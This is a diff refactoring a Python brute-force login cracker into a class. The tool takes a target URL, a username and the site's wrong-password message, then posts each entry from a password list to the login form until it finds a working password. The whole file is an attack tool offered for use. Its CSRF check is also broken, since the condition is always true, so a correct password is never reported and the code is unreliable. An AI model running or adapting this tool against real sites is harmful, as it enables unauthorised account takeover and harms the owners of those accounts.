@@ -1,7 +1,8 @@
 ######################################################################################################
 # Title: Brute force                                                                                 #
 # Author: Tanvir Hossain Antu                                                                        #
-# Github : https://github.com/Antu7                                                                  #
+# Github : https://github.com/Antu7      
+# If you use the code give me the credit please #
 ######################################################################################################
 
 print (""" 
@@ -18,7 +19,7 @@ print ("""
 
 """)
 
-z = """     
+banner = """     
 
 
 
@@ -35,37 +36,48 @@ import requests
 import time
 import sys
 
-url = input("Enter Target Url: ")
-username = input("Enter Target Username: ")
-error = input("Enter Wrong Password Error Message: ")
+class BruteForceCracker:
+    def __init__(self, url, username, error_message):
+        self.url = url
+        self.username = username
+        self.error_message = error_message
+        
+        for run in banner:
+            sys.stdout.write(run)
+            sys.stdout.flush()
+            time.sleep(0.02)
 
-for c in z:
-    sys.stdout.write(c)
-    sys.stdout.flush()
-    time.sleep(0.02)
-
-try: 
-    def bruteCracking(username,url,error):
+    def crack(self, passwords):
         count = 0
         for password in passwords:
             password = password.strip()
             count = count + 1
             print("Trying Password: "+ str(count) + ' Time For => ' + password)
-            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
-            response = requests.post(url, data=data_dict)
-            if error in str(response.content):
+            data_dict = {"LogInID": self.username,"Password": password, "Log In":"submit"}
+            response = requests.post(self.url, data=data_dict)
+            if self.error_message in str(response.content):
                 pass
             elif "CSRF" or "csrf" in str(response.content):
                 print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
-                exit()
+                return
             else:
-                print("Username: ---> " + username)
+                print("Username: ---> " + self.username)
                 print("Password: ---> " + password)
-                exit()
-except:
-    print("Some Error Occurred Please Check Your Internet Connection !!")
+                return
+        print("[!!] password not in list")
 
-with open("passwords.txt", "r") as passwords:
-    bruteCracking(username,url,error)
 
-print("[!!] password not in list")
+def main():
+    url = input("Enter Target Url: ")
+    username = input("Enter Target Username: ")
+    error = input("Enter Wrong Password Error Message: ")
+    cracker = BruteForceCracker(url, username, error)
+
+    try:
+        with open("passwords.txt", "r") as passwords:
+            cracker.crack(passwords)
+    except:
+        print("Some Error Occurred Please Check Your Internet Connection !!")
+
+if __name__ == '__main__':
+    main()
